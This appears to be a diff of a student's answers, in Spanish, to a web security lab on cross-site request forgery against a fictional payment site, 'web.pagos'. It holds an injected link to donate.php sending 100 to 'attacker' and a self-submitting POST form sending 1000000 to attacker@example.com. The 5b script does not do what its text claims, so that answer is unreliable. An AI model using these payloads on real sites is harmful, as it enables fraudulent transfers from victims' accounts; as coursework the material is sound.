@@ -233,18 +233,82 @@ a) Editad un jugador para conseguir que, en el listado de jugadores (list_player
 
 | Campos                                     |  Valores                                     | 
 |---------------------------------------------|------------------------------------------------------| 
-| En el campo...                     |                                                   | 
-| Introduzco...                 |                                                   | 
- 
+| En el campo...                     |     Team name                                              | 
+| Introduzco...                 |     `<body>  <a href="http://web.pagos/donate.php?amount=100&receiver=attacker" class="boton">Profile</a> </body> `   | 
+
+IMG06
+
 ## Apartado 5b
 b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón.Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show_comments.php).
+
+La opción que he pensado sería de poner este script para que no se levanten sospechas y cuando el usario haga click en Show/Add Comments, le mandará automaticamente a donde tengamos la redirección o donde el script nos mande:
+
+``` html
+<script>
+function showDonationRequest() {
+  const donationRequest = document.getElementById("solicitudDonacion");
+  donationRequest.style.display = "block"; // Make the donation request visible
+}
+</script>
+
+```
 
 ## Apartado 5c
 c) Pero 'web.pagos' sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
 
 Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).
 
+**Sesión iniciada:** El usuario debe haber iniciado sesión en su cuenta de "web.pagos". Esto asegura que la plataforma pueda identificar al usuario que realiza la donación y debitar los 100€ de su cuenta.
+
+**Fondos suficientes:** El usuario debe tener fondos suficientes en su cuenta para realizar la donación. La plataforma verificará si el saldo disponible del usuario es igual o superior a 100€ antes de procesar la donación.
+
+**Destinatario válido:** El destinatario especificado en la solicitud de donación debe ser un usuario registrado y válido en la plataforma de "web.pagos". Esto garantiza que la donación se dirija correctamente a la cuenta del destinatario.
+
+**Confirmación de la transacción:** Es posible que la plataforma requiera una confirmación adicional por parte del usuario antes de procesar la donación. Esto puede incluir una pantalla de confirmación donde el usuario debe revisar los detalles de la transacción antes de completarla.
+
 ## Apartado 5d
 d) Si 'web.pagos' modifica la página 'donate.php' para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.
 
+Este código simula cómo un atacante podría manipular los parámetros de la solicitud de donación para enviar una donación fraudulenta y estaremos enviando los parámetros "amount" y receiver" por POST: 
 
+``` html
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ataque simulado</title>
+<script>
+function simulateAttack() {
+  // Aquí se crea el formulario
+  var form = document.createElement("form");
+  form.setAttribute("method", "post");
+  form.setAttribute("action", "http://web.pagos/donate.php");
+
+  // Se añaden los parámetros manipulados
+  var amountInput = document.createElement("input");
+  amountInput.setAttribute("type", "hidden");
+  amountInput.setAttribute("name", "amount");
+  amountInput.setAttribute("value", "1000000"); // Valor manipulado
+  form.appendChild(amountInput);
+
+  var receiverInput = document.createElement("input");
+  receiverInput.setAttribute("type", "hidden");
+  receiverInput.setAttribute("name", "receiver");
+  receiverInput.setAttribute("value", "attacker@example.com"); // Valor manipulado
+  form.appendChild(receiverInput);
+
+  // Aqui se agrega al formulario al cuerpo del documento y enviarlo
+  document.body.appendChild(form);
+  form.submit();
+}
+</script>
+</head>
+<body>
+  <button onclick="simulateAttack()">Realizar donación</button>
+</body>
+</html>
+
+
+```
